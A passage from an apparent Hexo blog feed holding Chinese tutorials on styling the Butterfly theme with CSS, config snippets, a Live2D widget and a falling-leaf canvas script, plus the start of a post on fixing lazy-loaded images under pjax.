hexo-butterfly-article-<span class="type">double</span>-row --save</span><br></pre></td></tr></table></figure><p>在网站的根配置文件下添加以下的代码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#双栏美化</span><br><span class="line">butterfly_article_double_row:</span><br><span class="line">  enable: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>【重要】这块有个点一定要注意，是在我们默认的根配置文件 _config.yml 中添加上述代码，而不是在主题配置文件中，如果配置在主题文件中后续hexo一键三连的时候会报错，解析有问题：</p><p>“Cannot read property ‘enable’ of undefined”</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404111532633.png" alt="img"> </p><p>这样之后，可以成功切换双栏了，但有个bug，页面比较丑，且页码是有问题的</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404111532753.png" alt="img"> </p><p>通过扒取其他博主的的样式代码，发现有些地方需要改一下，在\themes\butterfly\source\css目录下新建文件mycss.css（一般存自己的一些样式代码，或者想本案例中需要做一些调整的样式代码）,添加以下代码：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#recent-posts</span>&gt;<span class="selector-class">.recent-post-item</span>&#123;</span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">30px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.layout</span> <span class="selector-id">#recent-posts</span>&gt;<span class="selector-class">.recent-post-item</span> <span class="selector-class">.post_cover</span>&#123;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">280px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#recent-posts</span>&gt;<span class="selector-class">.recent-post-item</span>&gt;<span class="selector-class">.recent-post-info</span>&#123;</span><br><span class="line"><span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">40px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.layout</span> <span class="selector-id">#recent-posts</span>&gt;<span class="selector-class">.recent-post-item</span>&gt;<span class="selector-class">.recent-post-info</span>&gt;<span class="selector-class">.article-title</span>&#123;</span><br><span class="line"><span class="attribute">font-size</span>: <span class="number">1.6em</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#recent-posts</span>&gt;<span class="selector-class">.recent-post-item</span>&gt;<span class="selector-class">.recent-post-info</span>&gt;<span class="selector-class">.article-meta-wrap</span>&#123;</span><br><span class="line"><span class="attribute">font-size</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#pagination</span> &#123;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">1rem</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#pagination</span> <span class="selector-class">.page-number</span>&#123;</span><br><span class="line"><span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">8px</span> <span class="number">16px</span> -<span class="number">4px</span> <span class="number">#2c2d300c</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.layout</span>&gt;<span class="selector-class">.recent-posts</span> <span class="selector-class">.pagination</span>&gt;<span class="selector-pseudo">:not</span>(<span class="selector-class">.space</span>)&#123;</span><br><span class="line"><span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">8px</span> <span class="number">16px</span> -<span class="number">4px</span> <span class="number">#2c2d300c</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时在主题配置目录inject字段下引入mycss.css文件</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">inject</span><br><span class="line">    - &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/css/mycss.css&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>再次查看效果</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404111534081.png" alt="image.png"> </p><p>个人感觉双栏没有单栏看着舒服，这块只做演示。。。</p><h1 id="添加卡通人物"><a href="#添加卡通人物" class="headerlink" title="添加卡通人物"></a>添加卡通人物</h1><p>可以给博客添加一个卡通宠物，还能根据你鼠标位置摇头，点击此处（<a href="https://github.com/EYHN/hexo-helper-live2d">点击此处</a>）进入项目地址：</p><h2 id="初级版"><a href="#初级版" class="headerlink" title="初级版"></a>初级版</h2><p>已经封装好了插件，但只是模型，不能说话、不能换装、功能较少。</p><p>1、安装模块</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-helper-live2d</span><br></pre></td></tr></table></figure><p>2、输入以下命令，下载相应的模型，将 packagename 更换成模型名称即可</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">npm install packagename  <span class="comment">//npm install live2d-widget-model-wanko</span></span><br></pre></td></tr></table></figure><p>具体的packagename和对应图片可以<a href="https://blog.csdn.net/u012931864/article/details/83054822">点击此处</a></p><p>3、在 站点配置文件 中新增如下内容（这块要求必须是站点配置文件，不能是主题配置文件）：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># Live2D</span><br><span class="line">## https:<span class="comment">//github.com/EYHN/hexo-helper-live2d</span></span><br><span class="line">live2d:</span><br><span class="line">  enable: <span class="literal">true</span></span><br><span class="line">  # enable: <span class="literal">false</span></span><br><span class="line">  scriptFrom: local # 默认</span><br><span class="line">  pluginRootPath: live2dw/ # 插件在站点上的根目录(相对路径)</span><br><span class="line">  pluginJsPath: lib/ # 脚本文件相对与插件根目录路径</span><br><span class="line">  pluginModelPath: assets/ # 模型文件相对与插件根目录路径</span><br><span class="line">  # scriptFrom: jsdelivr # jsdelivr CDN</span><br><span class="line">  # scriptFrom: unpkg # unpkg CDN</span><br><span class="line">  # scriptFrom: https:<span class="comment">//cdn.jsdelivr.net/npm/live2d-widget@3.x/lib/L2Dwidget.min.js # 你的自定义 url</span></span><br><span class="line">  tagMode: <span class="literal">false</span> # 标签模式, 是否仅替换 live2d tag标签而非插入到所有页面中</span><br><span class="line">  debug: <span class="literal">false</span> # 调试, 是否在控制台输出日志</span><br><span class="line">  model:</span><br><span class="line">    use: live2d-widget-model-wanko # npm-<span class="keyword">module</span> <span class="keyword">package</span> name</span><br><span class="line">    # use: wanko # 博客根目录/live2d_models/ 下的目录名</span><br><span class="line">    # use: ./wives/wanko # 相对于博客根目录的路径</span><br><span class="line">    # use: https:<span class="comment">//cdn.jsdelivr.net/npm/live2d-widget-model-wanko@1.0.5/assets/wanko.model.json # 你的自定义 url</span></span><br><span class="line">  display:</span><br><span class="line">    position: right</span><br><span class="line">    width: <span class="number">150</span></span><br><span class="line">    height: <span class="number">300</span></span><br><span class="line">  mobile:</span><br><span class="line">    show: <span class="literal">false</span> # 手机中是否展示</span><br></pre></td></tr></table></figure><p>3、展示如下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404111534918.png" alt="img"> </p><h2 id="进阶版"><a href="#进阶版" class="headerlink" title="进阶版"></a>进阶版</h2><p>网上也有一些进阶版的卡通人物实现，功能齐全。能说话、能换装、能玩游戏、能拍照、还能自定义。</p><p>具体实现，可以参考：</p><p><a href="https://augu1sto.gitee.io/ee36c104ddd2/">Hexo美化|站宠？看板娘？live2d配置（附魔改插件和新模型）</a></p><p><a href="https://zhuanlan.zhihu.com/p/58325389">Hexo博客NexT主题美化之新增看板娘(能说话、能换装)</a></p><h1 id="小标题添加旋转小风车"><a href="#小标题添加旋转小风车" class="headerlink" title="小标题添加旋转小风车"></a>小标题添加旋转小风车</h1><p>1、打开 _config.butterfly.yml<br>找到 Beautify，将 <a href="https://so.csdn.net/so/search?q=enable&spm=1001.2101.3001.7020">enable</a> 设置为 true，title-prefix-icon 设置为 ‘\f863’</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># Beautify (美化頁面顯示)</span><br><span class="line">beautify:</span><br><span class="line">    enable: <span class="literal">true</span></span><br><span class="line">    field: post # site/post</span><br><span class="line">    title-prefix-icon: <span class="string">&#x27;\f863&#x27;</span> # <span class="string">&#x27;\f0c1&#x27;</span></span><br><span class="line">    title-prefix-icon-color: <span class="string">&quot;#F47466&quot;</span></span><br></pre></td></tr></table></figure><p>2、在主题<a href="https://so.csdn.net/so/search?q=%E6%96%87%E4%BB%B6%E5%A4%B9&spm=1001.2101.3001.7020">文件夹</a> source&#x2F;css&#x2F; 中创建一个 icon.css，内容如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 文章页H1-H6图标样式效果 */</span></span><br><span class="line"><span class="comment">/* 控制风车转动速度 4s那里可以自己调节快慢 */</span></span><br><span class="line">h1::before,</span><br><span class="line">h2::before,</span><br><span class="line">h3::before,</span><br><span class="line">h4::before,</span><br><span class="line">h5::before,</span><br><span class="line">h6::before &#123;</span><br><span class="line">  -webkit-animation: ccc 4s linear infinite;</span><br><span class="line">  animation: ccc 4s linear infinite;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 控制风车转动方向 -1turn 为逆时针转动，1turn 为顺时针转动，相同数字部分记得统一修改 */</span></span><br><span class="line">@-webkit-keyframes ccc &#123;</span><br><span class="line">  <span class="number">0</span>% &#123;</span><br><span class="line">    -webkit-transform: rotate(0deg);</span><br><span class="line">    transform: rotate(0deg);</span><br><span class="line">  &#125;</span><br><span class="line">  to &#123;</span><br><span class="line">    -webkit-transform: rotate(-1turn);</span><br><span class="line">    transform: rotate(-1turn);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@keyframes</span> ccc &#123;</span><br><span class="line">  <span class="number">0</span>% &#123;</span><br><span class="line">    -webkit-transform: rotate(0deg);</span><br><span class="line">    transform: rotate(0deg);</span><br><span class="line">  &#125;</span><br><span class="line">  to &#123;</span><br><span class="line">    -webkit-transform: rotate(-1turn);</span><br><span class="line">    transform: rotate(-1turn);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 设置风车颜色 */</span></span><br><span class="line">#content-inner.layout h1::before &#123;</span><br><span class="line">  color: #ef50a8;</span><br><span class="line">  margin-left: -<span class="number">1.</span>55rem;</span><br><span class="line">  font-size: <span class="number">1.</span>3rem;</span><br><span class="line">  margin-top: -<span class="number">0.</span>23rem;</span><br><span class="line">&#125;</span><br><span class="line">#content-inner.layout h2::before &#123;</span><br><span class="line">  color: #fb7061;</span><br><span class="line">  margin-left: -<span class="number">1.</span>35rem;</span><br><span class="line">  font-size: <span class="number">1.</span>1rem;</span><br><span class="line">  margin-top: -<span class="number">0.</span>12rem;</span><br><span class="line">&#125;</span><br><span class="line">#content-inner.layout h3::before &#123;</span><br><span class="line">  color: #ffbf00;</span><br><span class="line">  margin-left: -<span class="number">1.</span>22rem;</span><br><span class="line">  font-size: <span class="number">0.</span>95rem;</span><br><span class="line">  margin-top: -<span class="number">0.</span>09rem;</span><br><span class="line">&#125;</span><br><span class="line">#content-inner.layout h4::before &#123;</span><br><span class="line">  color: #a9e000;</span><br><span class="line">  margin-left: -<span class="number">1.</span>05rem;</span><br><span class="line">  font-size: <span class="number">0.</span>8rem;</span><br><span class="line">  margin-top: -<span class="number">0.</span>09rem;</span><br><span class="line">&#125;</span><br><span class="line">#content-inner.layout h5::before &#123;</span><br><span class="line">  color: #57c850;</span><br><span class="line">  margin-left: -<span class="number">0.</span>9rem;</span><br><span class="line">  font-size: <span class="number">0.</span>7rem;</span><br><span class="line">  margin-top: 0rem;</span><br><span class="line">&#125;</span><br><span class="line">#content-inner.layout h6::before &#123;</span><br><span class="line">  color: #5ec1e0;</span><br><span class="line">  margin-left: -<span class="number">0.</span>9rem;</span><br><span class="line">  font-size: <span class="number">0.</span>66rem;</span><br><span class="line">  margin-top: 0rem;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* s设置风车hover动效 6s那里可以自己调节快慢*/</span></span><br><span class="line">#content-inner.layout h1:hover,</span><br><span class="line">#content-inner.layout h2:hover,</span><br><span class="line">#content-inner.layout h3:hover,</span><br><span class="line">#content-inner.layout h4:hover,</span><br><span class="line">#content-inner.layout h5:hover,</span><br><span class="line">#content-inner.layout h6:hover &#123;</span><br><span class="line">  color: <span class="keyword">var</span>(--theme-color);</span><br><span class="line">&#125;</span><br><span class="line">#content-inner.layout h1:hover::before,</span><br><span class="line">#content-inner.layout h2:hover::before,</span><br><span class="line">#content-inner.layout h3:hover::before,</span><br><span class="line">#content-inner.layout h4:hover::before,</span><br><span class="line">#content-inner.layout h5:hover::before,</span><br><span class="line">#content-inner.layout h6:hover::before &#123;</span><br><span class="line">  color: <span class="keyword">var</span>(--theme-color);</span><br><span class="line">  -webkit-animation: ccc 6s linear infinite;</span><br><span class="line">  animation: ccc 6s linear infinite;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3、并在 _config.butterfly.yml 中找到 <a href="https://so.csdn.net/so/search?q=inject&spm=1001.2101.3001.7020">inject</a>，在 head 下添加</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">- &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/css/icon.css&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>最终展示效果如下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404111534447.png" alt="img"> </p><h1 id="自定义鼠标指针样式"><a href="#自定义鼠标指针样式" class="headerlink" title="自定义鼠标指针样式"></a><strong>自定义鼠标指针样式</strong></h1><p>1、选定好看的鼠标样式，这块为了简答，选择两种鼠标样式，如下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404111535448.png" alt="img"> </p><p>下载地址为：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">https:<span class="comment">//cdn.jsdelivr.net/gh/TRHX/CDN-for-itrhx.com@1.0/images/mouse.cur</span></span><br><span class="line">https:<span class="comment">//cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/img/pointer.cur</span></span><br></pre></td></tr></table></figure><p>2、在 &#x2F;themes&#x2F;butterfly&#x2F;source&#x2F;css路径下创建一个mouse.css文件，在文件中添加如下代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">body &#123;</span><br><span class="line">  cursor:url(/img/pointer/mouse.cur),</span><br><span class="line">        <span class="keyword">default</span>;</span><br><span class="line">&#125;</span><br><span class="line">a,</span><br><span class="line">img &#123;</span><br><span class="line">  cursor:url(/img/pointer/pointer.cur),</span><br><span class="line">        <span class="keyword">default</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3、打开站点主题配置文件_config.butterfly.yml，找到inject，在head处直接引入该文件：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">inject:</span><br><span class="line">  head:</span><br><span class="line">  - &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/css/mouse.css&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>效果如下所示：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404111535495.png" alt="img"> </p><h1 id="添加背景动态彩带效果"><a href="#添加背景动态彩带效果" class="headerlink" title="添加背景动态彩带效果"></a>添加背景动态彩带效果</h1><p>butterfly提供三种效果：静止彩带、动态彩带、canvas_nest</p><p>我选的是动态彩条，修改主题配置文件：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">canvas_fluttering_ribbon: # 动态彩带</span><br><span class="line">  enable: <span class="literal">true</span></span><br><span class="line">  mobile: <span class="literal">false</span> # <span class="literal">false</span> 手机端不显示 <span class="literal">true</span> 手机端显示</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404111535952.png" alt="img"> </p><h1 id="添加枫叶飘落效果"><a href="#添加枫叶飘落效果" class="headerlink" title="添加枫叶飘落效果"></a>添加枫叶飘落效果</h1><p>步骤和前面的基本类似，都是本地引入JS文件，在配置文件中直接调用即可</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> stop, staticx;</span><br><span class="line"><span class="type">var</span> <span class="variable">img</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Image</span>();</span><br><span class="line">img.src = <span class="string">&quot;https://img.cdn.nesxc.com/2022/02/202202251325420webp&quot;</span>;</span><br><span class="line"></span><br><span class="line">function <span class="title function_">Sakura</span><span class="params">(x, y, s, r, fn)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.x = x;</span><br><span class="line">    <span class="built_in">this</span>.y = y;</span><br><span class="line">    <span class="built_in">this</span>.s = s;</span><br><span class="line">    <span class="built_in">this</span>.r = r;</span><br><span class="line">    <span class="built_in">this</span>.fn = fn</span><br><span class="line">&#125;</span><br><span class="line">Sakura.prototype.draw = function(cxt) &#123;</span><br><span class="line">    cxt.save();</span><br><span class="line">    <span class="type">var</span> <span class="variable">xc</span> <span class="operator">=</span> <span class="number">20</span> * <span class="built_in">this</span>.s / <span class="number">2</span>;</span><br><span class="line">    cxt.translate(<span class="built_in">this</span>.x, <span class="built_in">this</span>.y);</span><br><span class="line">    cxt.rotate(<span class="built_in">this</span>.r);</span><br><span class="line">    cxt.drawImage(img, <span class="number">0</span>, <span class="number">0</span>, <span class="number">20</span> * <span class="built_in">this</span>.s, <span class="number">20</span> * <span class="built_in">this</span>.s);</span><br><span class="line">    cxt.restore()</span><br><span class="line">&#125;;</span><br><span class="line">Sakura.prototype.update = function() &#123;</span><br><span class="line">    <span class="built_in">this</span>.x = <span class="built_in">this</span>.fn.x(<span class="built_in">this</span>.x, <span class="built_in">this</span>.y);</span><br><span class="line">    <span class="built_in">this</span>.y = <span class="built_in">this</span>.fn.y(<span class="built_in">this</span>.y, <span class="built_in">this</span>.y);</span><br><span class="line">    <span class="built_in">this</span>.r = <span class="built_in">this</span>.fn.r(<span class="built_in">this</span>.r);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.x &gt; window.innerWidth || <span class="built_in">this</span>.x &lt; <span class="number">0</span> || <span class="built_in">this</span>.y &gt; window.innerHeight || <span class="built_in">this</span>.y &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.r = getRandom(<span class="string">&quot;fnr&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (Math.random() &gt; <span class="number">0.4</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.x = getRandom(<span class="string">&quot;x&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.y = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">this</span>.s = getRandom(<span class="string">&quot;s&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.r = getRandom(<span class="string">&quot;r&quot;</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.x = window.innerWidth;</span><br><span class="line">            <span class="built_in">this</span>.y = getRandom(<span class="string">&quot;y&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.s = getRandom(<span class="string">&quot;s&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.r = getRandom(<span class="string">&quot;r&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">SakuraList = function() &#123;</span><br><span class="line">    <span class="built_in">this</span>.list = []</span><br><span class="line">&#125;;</span><br><span class="line">SakuraList.prototype.push = function(sakura) &#123;</span><br><span class="line">    <span class="built_in">this</span>.list.push(sakura)</span><br><span class="line">&#125;;</span><br><span class="line">SakuraList.prototype.update = function() &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">var</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, len = <span class="built_in">this</span>.list.length; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="built_in">this</span>.list[i].update()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">SakuraList.prototype.draw = function(cxt) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">var</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, len = <span class="built_in">this</span>.list.length; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="built_in">this</span>.list[i].draw(cxt)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">SakuraList.prototype.get = function(i) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.list[i]</span><br><span class="line">&#125;;</span><br><span class="line">SakuraList.prototype.size = function() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.list.length</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">function <span class="title function_">getRandom</span><span class="params">(option)</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> ret, random;</span><br><span class="line">    <span class="keyword">switch</span> (option) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;x&quot;</span>:</span><br><span class="line">            ret = Math.random() * window.innerWidth;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;y&quot;</span>:</span><br><span class="line">            ret = Math.random() * window.innerHeight;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;s&quot;</span>:</span><br><span class="line">            ret = Math.random();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;r&quot;</span>:</span><br><span class="line">            ret = Math.random() * <span class="number">4</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;fnx&quot;</span>:</span><br><span class="line">            random = -<span class="number">0.5</span> + Math.random() * <span class="number">1</span>;</span><br><span class="line">            ret = function(x, y) &#123;</span><br><span class="line">                <span class="keyword">return</span> x + <span class="number">0.5</span> * random - <span class="number">1.7</span></span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;fny&quot;</span>:</span><br><span class="line">            random = <span class="number">1.5</span> + Math.random() * <span class="number">0.7</span>;</span><br><span class="line">            ret = function(x, y) &#123;</span><br><span class="line">                <span class="keyword">return</span> y + random</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;fnr&quot;</span>:</span><br><span class="line">            random = Math.random() * <span class="number">0.03</span>;</span><br><span class="line">            ret = function(r) &#123;</span><br><span class="line">                <span class="keyword">return</span> r + random</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function <span class="title function_">startSakura</span><span class="params">()</span> &#123;</span><br><span class="line">    requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || window.msRequestAnimationFrame || window.oRequestAnimationFrame;</span><br><span class="line">    <span class="type">var</span> <span class="variable">canvas</span> <span class="operator">=</span> document.createElement(<span class="string">&quot;canvas&quot;</span>),</span><br><span class="line">        cxt;</span><br><span class="line">    staticx = <span class="literal">true</span>;</span><br><span class="line">    canvas.height = window.innerHeight;</span><br><span class="line">    canvas.width = window.innerWidth;</span><br><span class="line">    canvas.setAttribute(<span class="string">&quot;style&quot;</span>, <span class="string">&quot;position: fixed;left: 0;top: 0;pointer-events: none;&quot;</span>);</span><br><span class="line">    canvas.setAttribute(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;canvas_sakura&quot;</span>);</span><br><span class="line">    document.getElementsByTagName(<span class="string">&quot;body&quot;</span>)[<span class="number">0</span>].appendChild(canvas);</span><br><span class="line">    cxt = canvas.getContext(<span class="string">&quot;2d&quot;</span>);</span><br><span class="line">    <span class="type">var</span> <span class="variable">sakuraList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SakuraList</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">var</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">50</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> sakura, randomX, randomY, randomS, randomR, randomFnx, randomFny;</span><br><span class="line">        randomX = getRandom(<span class="string">&quot;x&quot;</span>);</span><br><span class="line">        randomY = getRandom(<span class="string">&quot;y&quot;</span>);</span><br><span class="line">        randomR = getRandom(<span class="string">&quot;r&quot;</span>);</span><br><span class="line">        randomS = getRandom(<span class="string">&quot;s&quot;</span>);</span><br><span class="line">        randomFnx = getRandom(<span class="string">&quot;fnx&quot;</span>);</span><br><span class="line">        randomFny = getRandom(<span class="string">&quot;fny&quot;</span>);</span><br><span class="line">        randomFnR = getRandom(<span class="string">&quot;fnr&quot;</span>);</span><br><span class="line">        sakura = <span class="keyword">new</span> <span class="title class_">Sakura</span>(randomX, randomY, randomS, randomR, &#123;</span><br><span class="line">            x: randomFnx,</span><br><span class="line">            y: randomFny,</span><br><span class="line">            r: randomFnR</span><br><span class="line">        &#125;);</span><br><span class="line">        sakura.draw(cxt);</span><br><span class="line">        sakuraList.push(sakura)</span><br><span class="line">    &#125;</span><br><span class="line">    stop = requestAnimationFrame(function() &#123;</span><br><span class="line">        cxt.clearRect(<span class="number">0</span>, <span class="number">0</span>, canvas.width, canvas.height);</span><br><span class="line">        sakuraList.update();</span><br><span class="line">        sakuraList.draw(cxt);</span><br><span class="line">        stop = requestAnimationFrame(arguments.callee)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">window.onresize = function() &#123;</span><br><span class="line">    <span class="type">var</span> <span class="variable">canvasSnow</span> <span class="operator">=</span> document.getElementById(<span class="string">&quot;canvas_snow&quot;</span>)</span><br><span class="line">&#125;;</span><br><span class="line">img.onload = function() &#123;</span><br><span class="line">    startSakura()</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">function <span class="title function_">stopp</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (staticx) &#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">child</span> <span class="operator">=</span> document.getElementById(<span class="string">&quot;canvas_sakura&quot;</span>);</span><br><span class="line">        child.parentNode.removeChild(child);</span><br><span class="line">        window.cancelAnimationFrame(stop);</span><br><span class="line">        staticx = <span class="literal">false</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        startSakura()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在配置文件中引入：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">inject:</span><br><span class="line">  head</span><br><span class="line">  bottom:</span><br><span class="line">    - &lt;script src=<span class="string">&quot;/js/leaves.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> 主题美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决hexo开启懒加载后图片无法立即显示的问题</title>
      <link href="/2024/04/11/%E8%A7%A3%E5%86%B3hexo%E5%BC%80%E5%90%AF%E6%87%92%E5%8A%A0%E8%BD%BD%E5%90%8E%E5%9B%BE%E7%89%87%E6%97%A0%E6%B3%95%E7%AB%8B%E5%8D%B3%E6%98%BE%E7%A4%BA%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2024/04/11/%E8%A7%A3%E5%86%B3hexo%E5%BC%80%E5%90%AF%E6%87%92%E5%8A%A0%E8%BD%BD%E5%90%8E%E5%9B%BE%E7%89%87%E6%97%A0%E6%B3%95%E7%AB%8B%E5%8D%B3%E6%98%BE%E7%A4%BA%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="本文目的"><a href="#本文目的" class="headerlink" title="本文目的"></a>本文目的</h1><p>主要介绍hexo-lazyload-image（图片懒加载）插件引发的bug以及相关API</p><h1 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h1><p>网站开启图片懒加载后，首次加载页面图片不显示，但是刷新一次后会显示。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404111526969.png" alt="img"> </p><h1 id="定位原因"><a href="#定位原因" class="headerlink" title="定位原因"></a>定位原因</h1><p>为了提升网页的浏览体验，开启了pjax优化，其原理在于pjax封装了ajax实现局部刷新，将网站变成了单页面应用。</p><p>懒加载插件如果配置不当，将与pjax插件发生冲突，导致以上bug。</p><h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h1><p>找到hexo项目的根目录下的站点配置文件_config.yml，具体路径：blog&#x2F;_config.yml，其中blog是你的项目文件夹。</p><p>找到lazyload配置，添上isSPA: true字段即可。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">lazyload:</span><br><span class="line">  enable: <span class="literal">true</span></span><br><span class="line">  onlypost: <span class="literal">false</span> # optional</span><br><span class="line">  loadingImg: # optional eg ./images/loading.gif</span><br><span class="line">  isSPA: <span class="literal">true</span> # optional</span><br></pre></td></tr></table></figure><h1 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h1><p>来仔细看一下hexo-lazyload-image 插件的API，它共有5个配置项：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">lazyload:</span><br><span class="line">  enable: <span class="literal">true</span></span><br><span class="line">  onlypost: <span class="literal">false</span> # optional</span><br><span class="line">  loadingImg: # optional eg ./images/loading.gif</span><br><span class="line">  isSPA: <span class="literal">false</span> # optional</span><br><span class="line">  preloadRatio: <span class="number">3</span> # optional, <span 